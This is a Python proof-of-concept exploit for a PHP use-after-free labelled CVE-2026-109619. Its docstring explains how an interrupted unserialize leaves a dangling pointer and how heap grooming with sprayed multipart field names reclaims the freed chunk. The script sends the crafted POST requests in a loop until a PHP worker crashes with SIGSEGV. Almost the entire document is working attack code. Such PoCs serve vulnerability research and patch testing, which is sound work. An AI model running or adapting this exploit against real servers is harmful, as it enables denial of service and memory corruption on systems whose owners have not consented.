#!/usr/bin/env python3
"""
Copyright 2026 Joshua Rosato.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.

Author: Joshua Rosato.

CVE-2026-109619 - heap grooming / arbitrary-write PoC.

Producer : a request whose unserialize() is interrupted by an OOM bailout
           leaves BG(unserialize).data pointing at a freed
           "struct php_unserialize_data" (72 bytes -> Zend MM bin 80).

Consumer : the next request's session upload-progress handler unserializes
           the session *before* RINIT, so php_var_unserialize_init() hands
           back the dangling pointer.  The unserializer then dereferences
           d->last / d->last_dtor, which now point into attacker controlled
           memory.

Grooming : the consumer request allocates a zend_string of 40..55 bytes
           (24 byte zend_string header + payload -> 80 byte bin) as a POST
           field name *before* the upload-progress field is processed.  That
           allocation re-uses the freed bin-80 chunk, so d->last becomes the
           zend_string refcount (1) and the unserializer dereferences 0x1.
"""
import argparse
import sys
import urllib.request
import urllib.error

BOUNDARY = "----PoCSpray"


def body(sid, key, pad_len, pad_count):
    out = [f"--{BOUNDARY}"]
    # 1. spray: persistent field names (zend_strings) of the right size
    for i in range(pad_count):
        out.append(f"--{BOUNDARY}")
        out.append(f'Content-Disposition: form-data; name="{"A" * pad_len}"')
        out.append("")
        out.append("v")
    # 2. session id
    out.append(f"--{BOUNDARY}")
    out.append('Content-Disposition: form-data; name="PHPSESSID"')
    out.append("")
    out.append(sid)
    # 3. upload progress key -> triggers the session handler (consumer)
    out.append(f"--{BOUNDARY}")
    out.append('Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"')
    out.append("")
    out.append(key)
    # 4. a file part so the progress handler actually updates the session
    out.append(f"--{BOUNDARY}")
    out.append('Content-Disposition: form-data; name="f"; filename="f.txt"')
    out.append("Content-Type: text/plain")
    out.append("")
    out.append("x")
    out.append(f"--{BOUNDARY}--")
    return "\r\n".join(out).encode()


def post(url, data, timeout=60):
    req = urllib.request.Request(url, data=data, headers={
        "Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
        "Content-Length": str(len(data)),
    })
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(300)
    except urllib.error.HTTPError as e:
        return e.code, e.read(300)
    except Exception as e:
        return None, str(e).encode()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default="http://127.0.0.1:9025/")
    ap.add_argument("--sid", default="abcdef0123456789abcdef0123456789")
    ap.add_argument("--key", default="poc")
    ap.add_argument("--iterations", type=int, default=20)
    ap.add_argument("--pad-len", type=int, default=48)
    ap.add_argument("--pad-count", type=int, default=1)
    ap.add_argument("--producer", default="producer.php")
    ap.add_argument("--consumer", default="consumer.php")
    args = ap.parse_args()

    base = args.url if args.url.endswith("/") else args.url + "/"
    cons = body(args.sid, args.key, args.pad_len, args.pad_count)

    for i in range(args.iterations):
        st, out = post(base + args.producer, cons)
        if st is None:
            print(f"[{i}] producer died: {out!r}")
            return 1
        st, out = post(base + args.consumer, cons)
        if st is None:
            print(f"[{i}] !! CONSUMER CRASHED (worker died): {out!r}")
            print("    -> use-after-free reached, worker terminated by SIGSEGV")
            return 2
        if i % 5 == 0:
            print(f"[{i}] consumer ok: {out[:100]!r}")
    print("no crash observed")
    return 0


if __name__ == "__main__":
    sys.exit(main())
